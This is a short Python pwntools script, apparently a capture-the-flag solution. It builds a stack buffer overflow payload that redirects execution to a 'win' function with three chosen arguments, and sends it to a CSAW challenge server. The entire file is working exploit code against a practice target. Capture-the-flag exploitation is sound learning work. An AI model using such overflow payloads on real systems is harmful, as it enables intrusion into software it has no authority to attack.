#!/usr/bin/env python3

from pwn import *

win_normal = p32(0x08048546)
padding1 = b'A'*44
padding2 = b'B'*4
arg1 = p32(0x600dc0de)
arg2 = p32(0xacce5515)
arg3 = p32(0xfea51b1e)

payload = padding1 + win_normal + padding2 + arg1 + arg2 + arg3

with open('payload.in','wb') as f:
    f.write(payload)

conn = remote('pwn.red.csaw.io',5007)

print(conn.recv())

print(payload)
conn.sendline(payload)

print()
print(conn.recv().decode()[:-1])

conn.close()
